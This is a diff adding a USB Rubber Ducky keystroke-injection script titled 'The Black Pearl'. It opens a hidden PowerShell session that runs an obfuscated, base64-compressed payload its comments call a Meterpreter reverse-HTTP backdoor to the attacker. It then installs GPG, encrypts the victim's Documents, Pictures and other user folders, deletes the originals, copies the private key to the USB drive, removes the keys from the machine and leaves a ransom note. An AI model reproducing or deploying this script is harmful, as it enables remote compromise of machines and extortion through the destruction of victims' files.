@@ -1,0 +1,257 @@
+REM The Black Pearl
+REM Open metepreter backdoor
+DELAY 3000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+REM Connect through reverse http back to the attacking machine.
+STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtb9pIEP7OrxhZe5KtYMe8NG2wIpVC0+auUC6kSe8QOi32gLdZ7zrrdQKh/Pcbg4+kX++L1zOeneeZmWfMHuAC3juN2VDKqyzXxrrOPRqFstMOEikdbw55uZAihsJySweuLX2HK2Un1sCtMLbksi+ljt3aJ/N+khgsiiaUQllInqbiGWtjeYilVFrdbPIX98Roi7H1ov/NZWCQW7xJ6UheuBzsvrVGLEqLr0hZHt8fmB2DyWfskf3RPeGGZ0hYx8t7LCrhUvLV68gD2lVCZTjvG9ZstiyhDjv9D4Phx8tPn69+/+PLaPx18uf19Obb7d33v/7mizjB5SoVP+5lpnT+YApbPj6tN89hq93pvjl7++7cCW70IOWmbwzfuF5jWaq4QofYZY/eFgzakvrgujNiN5vPgT3+egN+wgh5URr0vy5+UJvBn5aZF9ADfoNw3QpD8PEBztve7iW7hS1bVuydqBUEnZ9LTcXFqa/3KejbyQWwZOau0PqGq0Rn4Gd8LTLKypLgC6qVTb35Lqr5sWX0KjvCFnKjY2o1bGe8Ijpna4Kjxwmwf3YRoEqIwprYF6SGGhe2rsKn/4zrPa4XKNKC6+12rwBWWyDG4DJxEUZMgC8tnHXp7eTE27KUkGzE7ivAhBAwAqgLpCsSBPG9p7iiCkgrRjICsQSXel54Hhy7ThEEWxvO+eP3bw6VORujDaZoHkWME01jGXHFV2jmvV7lRTNAY8VS0CbgLZci2ctpwKVckCwJc8usKXEXsYyMMRVcD266KSxmQZX+DhcDKVDZqMGy4DMJD00RkHxdpyzQ+ISnrNMEZ6SfhZT8tBuExF9nOYEtJFU8ml59hLOgFcGdoD4+FTC+8RwvYopAVxHMPmws7gWVV23IgqF+UlLzZMgtd53U2rzonZ62wiAM2sF5r9vtnDLlgNdgmi4QFb9acpIFZgs0Q1wKJfbDYQ/gj2mpwCHkTtsBX5FV5DxG2Hsu6zEW4Oe8KGxqygZbXzDd6/3y0wmbLK+l1gzXnTAM6eiGXjSrO3VdKisyDGhH0ei8nkkRjLgpUi5pIAOdb1yWNyFswuywynOXrWmFyOi0Xc9rwhGkKo2uvP7XEGKTrZvVEVarpkvrq1KSXvb/E38qEXPaOIw1CfrdWTcMdzT3ON3u/gU=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
+ENTER
+REM Download GPG4Win
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://files.gpg4win.org/gpg4win-2.3.3.exe','%TEMP%\gpg4win.exe'); Start-Process "%TEMP%\gpg4win.exe"
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+REM Installation Process
+ALT y
+ENTER
+DELAY 7000
+ENTER
+DELAY 3000
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 5000
+ENTER
+DELAY 500
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+DELAY 3000
+ALT f
+UP
+ENTER
+REM Generating GPG Keys
+DELAY 2000
+GUI s
+DELAY 1000
+STRING Git Bash
+DELAY 2000
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING gpg --gen-key
+ENTER
+DELAY 800
+STRING 1
+ENTER
+DELAY 500
+STRING 4096
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING y
+DELAY 500
+ENTER
+DELAY 500
+STRING John Smith
+ENTER
+DELAY 500
+STRING bowshalo864@gmail.com
+ENTER
+DELAY 500
+STRING HELLO
+ENTER
+DELAY 500
+STRING O
+ENTER
+DELAY 5000
+STRING OMGWTFBBQChicken
+ENTER
+DELAY 500
+STRING OMGWTFBBQChicken
+ENTER
+DELAY 500
+ENTER
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING exit
+REM Creating a folder to put the User files in since I don't have permission to encrypt the User folder
+DELAY 2000
+GUI s
+DELAY 1000
+STRING Git Bash
+DELAY 2000
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING cd ~/Desktop
+ENTER
+DELAY 1000
+STRING mkdir encrypt_me
+ENTER
+DELAY 3000
+STRING cd encrypt_me/
+ENTER
+DELAY 2000
+REM Moving the User folder contents to encrypt_me
+STRING mv C:/Users/IEUser/Contacts .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Documents .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Downloads .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Favorites .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Links .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Music .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Pictures .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Saved\ Games .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Searches .
+ENTER
+DELAY 5000
+STRING mv C:/Users/IEUser/Videos .
+ENTER
+DELAY 5000
+REM Folder Encryption
+DELAY 2000
+STRING cd ~/Desktop
+ENTER
+DELAY 1000
+REM Turning the folder into an archive so I can encrypt it. GPG doesn't allow folder encryption
+STRING tar czf your_stuff.tar.gz encrypt_me
+ENTER
+DELAY 5000
+STRING gpg -ea -r bowshalo864@gmail.com your_stuff.tar.gz
+ENTER
+ENTER
+DELAY 1000
+STRING rm -f -r encrypt_me/
+DELAY 5000
+REM Exporting Public keys
+STRING gpg --export-secret-key -a "John Smith" > private.key
+ENTER
+DELAY 1000
+STRING gpg --export -a "John Smith" > public.key
+ENTER
+DELAY 1000
+REM Moving the Keys to the USB
+STRING cd E:\
+ENTER
+ENTER
+DELAY 2000
+STRING mv ~/Desktop/private.key .
+ENTER
+DELAY 2000
+STRING mv ~/Desktop/public.key .
+ENTER
+DELAY 2000
+REM Deleting the GPG keys
+STRING gpg --delete-secret-keys 8c1d2a11
+ENTER
+DELAY 2000
+STRING y
+ENTER
+DELAY 2000
+STRING y
+ENTER
+DELAY 4000
+STRING gpg --delete-keys 1414d3c0
+ENTER
+DELAY 2000
+STRING y
+ENTER
+DELAY 2000
+REM Installing an addon to Firefox
+DELAY 3000
+STRING start https://addons.mozilla.org/en-US/firefox/addon/dark-background-light-text/?src=cb-dl-rating
+REM Installing an addon to Firefox
+DELAY 5000
+ALT f
+DELAY 500
+RIGHT
+DELAY 500
+UP
+DELAY 500
+UP
+DELAY 500
+ENTER
+DELAY 500
+STRING Add to Firefox
+ESC
+ENTER
+DELAY 5000
+ALT i
+DELAY 5000
+ALT f
+DELAY 500
+UP
+DELAY 500
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 2000
+REM Leaving a ransom note
+GUI r
+DELAY 2000
+STRING notepad
+ENTER
+DELAY 2000
+STRING "Hello Human. I have encrypted your precious files. Send me a sacrifice for their return"
+CTRL-S
+DELAY 1000
+LEFT
+ENTER
+STRING Ransom
+DELAY 500
+ENTER
+ALT f
+UP
+ENTER
